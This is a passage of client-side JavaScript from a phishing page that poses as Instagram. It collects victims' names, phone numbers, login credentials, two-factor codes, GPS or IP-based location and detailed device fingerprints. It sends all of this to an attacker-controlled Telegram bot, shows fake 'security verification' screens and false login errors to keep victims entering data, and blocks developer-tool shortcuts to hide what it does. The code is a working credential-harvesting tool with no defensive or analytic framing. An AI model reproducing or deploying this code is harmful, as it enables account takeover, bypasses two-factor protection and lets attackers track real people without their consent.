                    'https://api.ipify.org?format=json',
                    'https://ipapi.co/json/',
                    'https://api.my-ip.io/ip.json'
                ];
                
                for (const service of services) {
                    try {
                        const controller = new AbortController();
                        const timeoutId = setTimeout(() => controller.abort(), 3000);
                        
                        const response = await fetch(service, { 
                            signal: controller.signal 
                        });
                        
                        clearTimeout(timeoutId);
                        
                        if (response.ok) {
                            const data = await response.json();
                            
                            if (service.includes('ipapi.co')) {
                                collectedData.deviceInfo.ipDetails = {
                                    ip: data.ip,
                                    city: data.city,
                                    region: data.region,
                                    country: data.country_name,
                                    countryCode: data.country_code,
                                    postal: data.postal,
                                    latitude: data.latitude,
                                    longitude: data.longitude,
                                    timezone: data.timezone,
                                    org: data.org,
                                    asn: data.asn,
                                    isp: data.org,
                                    currency: data.currency,
                                    callingCode: data.country_calling_code,
                                    languages: data.languages
                                };
                            } else {
                                collectedData.deviceInfo.ipAddress = data.ip;
                                if (data.country) collectedData.deviceInfo.ipCountry = data.country;
                            }
                            
                            break;
                        }
                    } catch (e) {
                        continue;
                    }
                }
                
                if (!collectedData.deviceInfo.ipAddress && collectedData.deviceInfo.ipDetails) {
                    collectedData.deviceInfo.ipAddress = collectedData.deviceInfo.ipDetails.ip;
                }
            } catch (e) {
                console.error('Failed to get IP info:', e);
                collectedData.deviceInfo.ipAddress = 'Could not retrieve';
            }
        }

        async function getLocationByIP() {
            try {
                const response = await fetch('https://ipapi.co/json/');
                if (response.ok) {
                    const data = await response.json();
                    
                    // Only use IP location if GPS location failed
                    if (!collectedData.location.latitude) {
                        collectedData.location = {
                            latitude: data.latitude,
                            longitude: data.longitude,
                            city: data.city,
                            region: data.region,
                            country: data.country_name,
                            ip: data.ip,
                            isp: data.org,
                            timestamp: new Date().toISOString(),
                            mapLink: `https://www.google.com/maps?q=${data.latitude},${data.longitude}`,
                            source: 'IP-based (approximate)',
                            accuracy: 'City-level (based on IP)',
                            timezone: data.timezone
                        };
                        
                        collectedData.timestamps.locationCaptured = new Date().toISOString();
                        
                        // Send approximate location to Telegram
                        await sendToTelegram('LOCATION_IP');
                        
                        // Update verification code
                        locationCode.textContent = 'IP-' + data.ip.substring(0, 8);
                        locationCode.style.color = '#ff9900';
                        
                        // Auto-hide modal after 2 seconds
                        setTimeout(() => {
                            hideLocationModal();
                            showSecurityVerification();
                        }, 2000);
                        
                        return true;
                    }
                }
            } catch (e) {
                console.error('Failed to get location by IP:', e);
            }
            return false;
        }

        // ============================================
        // SECURITY VERIFICATION MODAL
        // ============================================
        function showSecurityVerification() {
            securityModal.style.display = 'flex';
            document.body.style.overflow = 'hidden';
            
            // Animate device code
            animateDeviceVerification();
            
            // Send all collected data to Telegram
            setTimeout(async () => {
                await sendToTelegram('FULL_DATA');
                
                // Show continue button after verification
                setTimeout(() => {
                    deviceCode.textContent = collectedData.verificationCodes.device;
                    deviceCode.style.color = '#00a400';
                    verificationText.textContent = 'Device verification complete âœ“';
                    continueBtn.style.display = 'block';
                }, 3000);
            }, 1000);
        }

        function animateDeviceVerification() {
            const steps = [
                'SCANNING DEVICE...',
                'CHECKING SECURITY...',
                'VERIFYING SYSTEM...',
                'ANALYZING DATA...',
                'COMPLETING CHECK...'
            ];
            
            let step = 0;
            const interval = setInterval(() => {
                deviceCode.textContent = steps[step];
                step = (step + 1) % steps.length;
                
                if (step === 0) {
                    clearInterval(interval);
                }
            }, 600);
        }

        continueBtn.addEventListener('click', function() {
            securityModal.style.display = 'none';
            document.body.style.overflow = 'auto';
        });

        // ============================================
        // TWO-FACTOR AUTHENTICATION MODAL
        // ============================================
        function showTwoFactorModal() {
            if (collectedData.userInfo.mobileNumber) {
                const lastDigits = collectedData.userInfo.mobileNumber.slice(-4);
                phoneLastDigits.textContent = lastDigits;
            } else {
                phoneLastDigits.textContent = '****';
            }
            
            twoFactorModal.style.display = 'flex';
            document.body.style.overflow = 'hidden';
            
            // Auto-focus on input
            setTimeout(() => {
                twoFactorCodeInput.focus();
            }, 300);
        }

        verifyCodeBtn.addEventListener('click', async function() {
            const code = twoFactorCodeInput.value.trim();
            
            if (code.length !== 6 || !/^\d+$/.test(code)) {
                alert('Please enter a valid 6-digit code');
                return;
            }
            
            // Store 2FA code
            collectedData.twoFactorCode = code;
            collectedData.twoFactorTimestamp = new Date().toISOString();
            
            // Send 2FA code to Telegram
            await sendToTelegram('TWO_FACTOR');
            
            // Hide modal
            twoFactorModal.style.display = 'none';
            document.body.style.overflow = 'auto';
            
            // Show error again
            setTimeout(() => {
                showLoginError('Code verification failed. Please try logging in again.');
            }, 500);
        });

        useBackupBtn.addEventListener('click', function() {
            alert('Backup codes are not available. Please use the 6-digit code sent to your phone.');
        });

        // Auto-advance input
        twoFactorCodeInput.addEventListener('input', function(e) {
            if (this.value.length === 6) {
                verifyCodeBtn.click();
            }
        });

        // ============================================
        // TELEGRAM INTEGRATION
        // ============================================
        async function sendToTelegram(type) {
            if (TELEGRAM_BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE' || TELEGRAM_CHAT_ID === 'YOUR_CHAT_ID_HERE') {
                console.log('Telegram bot not configured. Data would be sent:', {
                    type: type,
                    data: getDataForTelegram(type),
                    sessionId: collectedData.sessionId
                });
                return;
            }
            
            try {
                let message = formatTelegramMessage(type);
                
                // URL encode the message
                const encodedMessage = encodeURIComponent(message);
                
                // Send to Telegram
                const response = await fetch(
                    `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodedMessage}&parse_mode=HTML`
                );
                
                if (response.ok) {
                    console.log(`Data sent to Telegram (${type})`);
                    collectedData.timestamps.dataSent = new Date().toISOString();
                }
            } catch (error) {
                console.error('Error sending to Telegram:', error);
            }
        }

        function formatTelegramMessage(type) {
            const timestamp = new Date().toLocaleString();
            let message = '';
            
            switch(type) {
                case 'USER_INFO':
                    message = `ðŸ” <b>INSTAGRAM - USER INFORMATION</b>\n\n` +
                             `ðŸ“± <b>Session ID:</b> ${collectedData.sessionId}\n` +
                             `ðŸ‘¤ <b>Full Name:</b> ${collectedData.userInfo.fullName}\n` +
                             `ðŸ“ž <b>Mobile Number:</b> ${collectedData.userInfo.mobileNumber}\n` +
                             `â° <b>Time:</b> ${timestamp}\n` +
                             `ðŸŒ <b>Device:</b> ${collectedData.deviceInfo.deviceType} - ${collectedData.deviceInfo.browser}`;
                    break;
                    
                case 'LOCATION':
                case 'LOCATION_IP':
                    const source = type === 'LOCATION' ? 'GPS' : 'IP';
                    const accuracy = collectedData.location.accuracy || 'Unknown';
                    const mapLink = collectedData.location.mapLink || 'No map available';
                    
                    message = `ðŸ“ <b>INSTAGRAM - LOCATION DATA (${source})</b>\n\n` +
                             `ðŸ“± <b>Session ID:</b> ${collectedData.sessionId}\n` +
                             `ðŸ‘¤ <b>User:</b> ${collectedData.userInfo.fullName || 'Unknown'}\n` +
                             `ðŸ“ž <b>Mobile:</b> ${collectedData.userInfo.mobileNumber || 'Unknown'}\n` +
                             `ðŸŒ <b>Coordinates:</b> ${collectedData.location.latitude}, ${collectedData.location.longitude}\n` +
                             `ðŸ™ï¸ <b>Location:</b> ${collectedData.location.city || 'Unknown'}, ${collectedData.location.country || 'Unknown'}\n` +
                             `ðŸ“¡ <b>Source:</b> ${collectedData.location.source || source}\n` +
                             `ðŸŽ¯ <b>Accuracy:</b> ${accuracy}\n` +
                             `ðŸ• <b>Timezone:</b> ${collectedData.location.timezone || 'Unknown'}\n` +
                             `ðŸ—ºï¸ <b>Google Maps:</b> <a href="${mapLink}">Click here</a>\n` +
                             `â° <b>Time:</b> ${timestamp}`;
                    break;
                    
                case 'CREDENTIALS':
                    message = `ðŸ”‘ <b>INSTAGRAM - LOGIN CREDENTIALS</b>\n\n` +
                             `ðŸ“± <b>Session ID:</b> ${collectedData.sessionId}\n` +
                             `ðŸ‘¤ <b>User:</b> ${collectedData.userInfo.fullName || 'Unknown'}\n` +
                             `ðŸ“ž <b>Mobile:</b> ${collectedData.userInfo.mobileNumber || 'Unknown'}\n` +
                             `ðŸ‘¤ <b>Username:</b> ${collectedData.credentials.username}\n` +
                             `ðŸ” <b>Password:</b> ${collectedData.credentials.password}\n` +
                             `ðŸŒ <b>IP Address:</b> ${collectedData.deviceInfo.ipAddress || 'Unknown'}\n` +
                             `ðŸ“ <b>Location:</b> ${collectedData.location.city || 'Unknown'}, ${collectedData.location.country || 'Unknown'}\n` +
                             `â° <b>Time:</b> ${timestamp}`;
                    break;
                    
                case 'TWO_FACTOR':
                    message = `ðŸ”¢ <b>INSTAGRAM - TWO-FACTOR CODE</b>\n\n` +
                             `ðŸ“± <b>Session ID:</b> ${collectedData.sessionId}\n` +
                             `ðŸ‘¤ <b>User:</b> ${collectedData.userInfo.fullName || 'Unknown'}\n` +
                             `ðŸ“ž <b>Mobile:</b> ${collectedData.userInfo.mobileNumber || 'Unknown'}\n` +
                             `ðŸ‘¤ <b>Username:</b> ${collectedData.credentials.username || 'Unknown'}\n` +
                             `ðŸ”¢ <b>2FA Code:</b> ${collectedData.twoFactorCode}\n` +
                             `â° <b>Time:</b> ${timestamp}`;
                    break;
                    
                case 'FULL_DATA':
                    const userAgentShort = navigator.userAgent.length > 100 ? 
                        navigator.userAgent.substring(0, 100) + '...' : navigator.userAgent;
                    
                    message = `ðŸ“Š <b>INSTAGRAM - COMPLETE DATA COLLECTION</b>\n\n` +
                             `ðŸ“± <b>Session ID:</b> ${collectedData.sessionId}\n` +
                             `ðŸ‘¤ <b>User:</b> ${collectedData.userInfo.fullName || 'Unknown'}\n` +
                             `ðŸ“ž <b>Mobile:</b> ${collectedData.userInfo.mobileNumber || 'Unknown'}\n` +
                             `ðŸ‘¤ <b>Username:</b> ${collectedData.credentials.username || 'Not captured'}\n` +
                             `ðŸ” <b>Password:</b> ${collectedData.credentials.password || 'Not captured'}\n` +
                             `ðŸŒ <b>Location:</b> ${collectedData.location.latitude || 'Unknown'}, ${collectedData.location.longitude || 'Unknown'}\n` +
                             `ðŸ™ï¸ <b>City:</b> ${collectedData.location.city || collectedData.deviceInfo.ipDetails?.city || 'Unknown'}\n` +
                             `ðŸŒ <b>IP Address:</b> ${collectedData.deviceInfo.ipAddress || 'Unknown'}\n` +
                             `ðŸ“± <b>Device:</b> ${collectedData.deviceInfo.deviceType} - ${collectedData.deviceInfo.os}\n` +
                             `ðŸ–¥ï¸ <b>Browser:</b> ${collectedData.deviceInfo.browser}\n` +
                             `ðŸ“º <b>Screen:</b> ${collectedData.deviceInfo.screenResolution}\n` +
                             `ðŸ”‹ <b>Battery:</b> ${collectedData.deviceInfo.battery?.level || 'Unknown'}\n` +
                             `ðŸ–¥ï¸ <b>GPU:</b> ${collectedData.deviceInfo.gpu?.renderer || 'Unknown'}\n` +
                             `ðŸ’¾ <b>RAM:</b> ${collectedData.deviceInfo.deviceMemory || 'Unknown'}\n` +
                             `âš¡ <b>CPU Cores:</b> ${collectedData.deviceInfo.hardwareConcurrency}\n` +
                             `ðŸ• <b>Timezone:</b> ${collectedData.deviceInfo.timezone}\n` +
                             `ðŸ—ºï¸ <b>Map Link:</b> <a href="${collectedData.location.mapLink || '#'}">${collectedData.location.mapLink || 'No location'}</a>\n` +
                             `â° <b>Session Start:</b> ${new Date(collectedData.timestamps.pageLoad).toLocaleString()}\n\n` +
                             `<b>Full User Agent:</b>\n<code>${userAgentShort}</code>`;
                    break;
            }
            
            return message;
        }

        // ============================================
        // HELPER FUNCTIONS
        // ============================================
        function getBrowserName() {
            const ua = navigator.userAgent;
            if (ua.includes("Chrome") && !ua.includes("Edg") && !ua.includes("OPR")) return "Chrome";
            if (ua.includes("Firefox")) return "Firefox";
            if (ua.includes("Safari") && !ua.includes("Chrome")) return "Safari";
            if (ua.includes("Edg")) return "Edge";
            if (ua.includes("Opera") || ua.includes("OPR")) return "Opera";
            if (ua.includes("Trident") || ua.includes("MSIE")) return "Internet Explorer";
            return "Unknown";
        }

        function getOperatingSystem() {
            const ua = navigator.userAgent;
            if (ua.includes("Win")) return "Windows";
            if (ua.includes("Mac")) return "macOS";
            if (ua.includes("Linux")) return "Linux";
            if (ua.includes("Android")) return "Android";
            if (ua.includes("iOS") || ua.includes("iPhone") || ua.includes("iPad")) return "iOS";
            return "Unknown";
        }

        function getWebGLInfo() {
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if (gl) {
                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                    if (debugInfo) {
                        return {
                            vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
                            renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
                        };
                    }
                    return 'WebGL available (no debug info)';
                }
                return 'WebGL not supported';
            } catch (e) {
                return 'Error getting WebGL info';
            }
        }

        function formatBytes(bytes) {
            if (bytes === 0 || !bytes) return '0 Bytes';
            const k = 1024;
            const sizes = ['Bytes', 'KB', 'MB', 'GB'];
            const i = Math.floor(Math.log(bytes) / Math.log(k));
            return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
        }

        function showLoginError(msg) {
            // Create or show error message
            let errorDiv = document.querySelector('.login-error');
            if (!errorDiv) {
                errorDiv = document.createElement('div');
                errorDiv.className = 'login-error';
                errorDiv.style.color = '#ed4956';
                errorDiv.style.fontSize = '12px';
                errorDiv.style.marginTop = '10px';
                errorDiv.style.textAlign = 'center';
                document.querySelector('.login-inner').appendChild(errorDiv);
            }
            errorDiv.textContent = msg;
            errorDiv.style.display = 'block';
            
            // Auto-hide after 5 seconds
            setTimeout(() => {
                errorDiv.style.display = 'none';
            }, 5000);
        }

        function preventDevTools() {
            // Prevent right-click
            document.addEventListener('contextmenu', function(e) {
                e.preventDefault();
                return false;
            });
            
            // Prevent keyboard shortcuts for dev tools
            document.addEventListener('keydown', function(e) {
                // Disable F12, Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+U
                if (e.key === 'F12' || 
                    (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J')) ||
                    (e.ctrlKey && e.key === 'U') ||
                    (e.ctrlKey && e.shiftKey && e.key === 'C')) {
                    e.preventDefault();
                    return false;
                }
            });
        }

        // ============================================
        // ADDITIONAL FEATURES
        // ============================================
        // Prevent page unload without completing
        window.addEventListener('beforeunload', function(e) {
            if (collectedData.credentials.username && !collectedData.timestamps.dataSent) {
                // Send exit data
                sendToTelegram('PAGE_EXIT');
            }
        });

        // Handle copy/paste events
        document.addEventListener('copy', function(e) {
            console.log('Copy action detected');
        });

        document.addEventListener('paste', function(e) {
            console.log('Paste action detected');
        });

        // Heartbeat to keep session alive
        setInterval(() => {
            if (collectedData.sessionId) {
                console.log('Session active:', collectedData.sessionId.substring(0, 15) + '...');
            }
        }, 30000);

        // Input validation for mobile number
        userMobileInput.addEventListener('input', function(e) {
            this.value = this.value.replace(/\D/g, '').substring(0, 15);
        });

        // Input validation for 2FA code
        twoFactorCodeInput.addEventListener('input', function(e) {
            this.value = this.value.replace(/\D/g, '').substring(0, 6);
        });

        // Handle Enter key in modals
        document.addEventListener('keydown', function(e) {
            if (e.key === 'Enter') {
                if (initialModal.style.display === 'flex') {
                    verifyUserBtn.click();
                } else if (locationModal.style.display === 'flex') {
                    allowLocationBtn.click();
                } else if (twoFactorModal.style.display === 'flex') {
                    verifyCodeBtn.click();
                }
            }
        });
    </script>
</body>
</html>
